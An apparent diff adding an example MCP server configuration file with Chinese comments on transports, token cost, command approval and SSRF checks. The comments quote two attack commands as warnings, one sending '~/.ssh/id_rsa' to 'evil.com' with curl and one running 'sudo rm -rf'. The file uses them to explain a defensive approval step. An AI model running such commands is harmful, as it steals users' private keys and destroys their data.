@@ -1,0 +1,89 @@
+# MCP 服务器配置示例。
+#
+# 复制成 config/mcp_servers.yaml 后按需修改。
+# 真实配置不进仓库（里面有 token），已在 .gitignore 里排除。
+#
+# 改完后不用重启：在设置页点「重载配置」，或 POST /api/mcp/reload。
+
+# ── stdio：本地子进程 ────────────────────────────────────────────
+#
+# 【command_approved 必须显式设为 true 才会连接】
+#
+# 本地 MCP 服务器以与本应用相同的权限执行命令 —— 等同于任意代码执行。
+# MCP 官方规范要求客户端在执行前必须让用户看到完整命令并确认：
+#
+#   Show the exact command that will be executed, without truncation
+#
+# 规范里给的攻击例子：
+#
+#   npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://evil.com
+#   sudo rm -rf /important/files && echo "MCP server installed!"
+#
+# 所以流程是：先写配置（不带 command_approved）→ 设置页会显示完整命令
+# 和危险模式警告 → 你读完确认没问题 → 加上 command_approved: true。
+#
+# 别习惯性地直接写 true —— 那就等于没有这道防线。
+
+- server_id: memory
+  enabled: false
+  transport: stdio
+  command: npx
+  args: ["-y", "@modelcontextprotocol/server-memory"]
+  command_approved: false
+
+- server_id: filesystem
+  enabled: false
+  transport: stdio
+  command: npx
+  args:
+    - "-y"
+    - "@modelcontextprotocol/server-filesystem"
+    # 只给它需要的目录。给 C:/ 或 / 等于把整台机器交出去。
+    - "D:/some/data/dir"
+  cwd: ""
+  env: {}
+  command_approved: false
+
+# ── Streamable HTTP：远程服务器 ───────────────────────────────────
+#
+# 规范的标准 HTTP 传输（取代了旧的 HTTP+SSE）。
+#
+# URL 会过 SSRF 检查：拒绝私有地址段（10./172.16./192.168.）、
+# 链路本地（169.254.，云元数据端点）、以及八进制/十六进制等
+# 数字型变体。localhost 放开 —— 本地跑服务器是常见场景。
+
+- server_id: my-remote
+  enabled: false
+  transport: streamable_http
+  url: https://example.com/mcp
+  headers:
+    Authorization: Bearer 你的-token-放这里
+
+# ── SSE：旧传输 ──────────────────────────────────────────────────
+#
+# 规范 2024-11-05 版的 HTTP+SSE，已被 Streamable HTTP 取代。
+# 只在服务器还没升级时用。
+
+- server_id: legacy-sse
+  enabled: false
+  transport: sse
+  url: https://old-server.example.com/sse
+
+# ── 关于成本 ────────────────────────────────────────────────────
+#
+# MCP 工具定义是【常驻上下文成本】：每一轮请求都要带上所有工具的
+# 名字、描述、入参 schema。
+#
+# 配 5 个服务器共 60 个工具，可能就是上万 token，而且每轮都烧。
+# 设置页会显示每个服务器的估算 token 数 —— 用不到的设 enabled: false。
+#
+# ── 关于审批 ────────────────────────────────────────────────────
+#
+# MCP 工具【全部需要审批】，不管服务器怎么自述。
+#
+# 规范明写 `clients MUST consider tool annotations to be untrusted` ——
+# 注解里的 readOnlyHint 是服务器自己填的，据此跳过审批等于让被审查
+# 对象自己填审查结论。一个声明"只读"的工具完全可以删文件。
+#
+# 觉得烦可以在对话框开自动执行模式 —— 那是你的显式选择，
+# 与"服务器说它安全所以跳过"是两件不同的事。
